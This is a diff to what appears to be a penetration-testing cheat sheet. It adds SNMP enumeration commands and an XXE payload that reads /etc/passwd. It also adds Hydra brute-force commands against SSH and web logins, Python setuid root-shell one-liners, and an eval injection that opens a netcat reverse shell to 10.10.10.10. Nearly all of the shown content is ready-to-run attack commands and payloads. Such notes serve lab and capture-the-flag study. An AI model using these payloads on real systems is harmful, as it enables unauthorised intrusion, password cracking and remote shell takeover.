@@ -193,11 +193,12 @@ $ https://ubuntu.com/tutorials/install-and-configure-samba
 $ nmap -sV --script imap-brute -p 143 10.10.10.10
 ```
 
-### 161,162 (SNMP - UDP)
+### Port 161, 162 (SNMP - UDP)
 
 ```bash
 => Install
 $ pip install snmpclitools
+$ sudo apt-get install snmp-mibs-downloader
 
 => Snmp-check
 $ snmp-check 10.10.10.10 -c public
@@ -207,6 +208,10 @@ $ snmpwalk -v1 -c public 10.10.10.10
 $ snmpwalk -c public 10.10.10.10
 $ snmpwalk -v1 -c public 10.10.10.10 1
 $ snmpwalk -v1 -c public 10.10.10.10 2
+$ snmpwalk -v 1 -c public 10.10.10.10 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+$ snmpwalk -m +MY-MIB -v 2c -c public 10.10.10.10 nsExtendObjects
+$ snmpwalk -m +MY-MIB -v 1 -c public 10.10.10.10 nsExtendObjects
+$ snmpwalk -m ALL -v 2c -c public 10.10.10.241 nsExtendObjects
 
 => Onesixtyone
 $ onesixtyone -c /path/to/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
@@ -562,6 +567,21 @@ $ .schema user
 $ UPDATE user SET passwd = "" where id 2;
 ```
 
+### XXE Injection
+
+```
+=> Payload
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<report>
+	<title>&xxe;</title>
+	<writer>John</writer>
+</report>
+
+=> References
+$ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
+```
+
 ### GraphQL Injection
 
 ```bash
@@ -580,19 +600,22 @@ https://apis.guru/graphql-voyager/
 ### Hydra
 
 ```bash
-# Install
+=> Install
 sudo apt-get install hydra-gtk
 
-# Commands
+=> Commands
 hydra -l nik -p rockyou.txt 10.10.10.10 ssh -t 30 -f
 hydra -L user.txt -P pass.txt 10.10.10.10 ssh -t 30 -f
 hydra -L user.txt -P pass.txt 10.10.10.10 ssh -s 2222 -t 30 -f
 
-# Json
+=> Json
 hydra -l admin -P rockyou.txt localhost http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden' -V -f
 
-# POST
+=> POST
 hydra -l admin -P rockyou.txt 10.10.10.10 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=loginError"
+
+=> GET
+hydra -l user -P rockyou.txt 10.10.10.10 http-get / 
 ```
 
 ### KeyHacks
@@ -2695,6 +2718,13 @@ python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 # Capabilities
 python -c 'import os; os.setuid(0); os.system("/bin/sh")'
 python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# SUDO
+sudo python3 /pathto/script.py
+
+# Notes (Found)
+eval('144+0|__import__("os").system("nc -e /bin/sh 10.10.10.10 443")')
 ```
 
 ### LXD
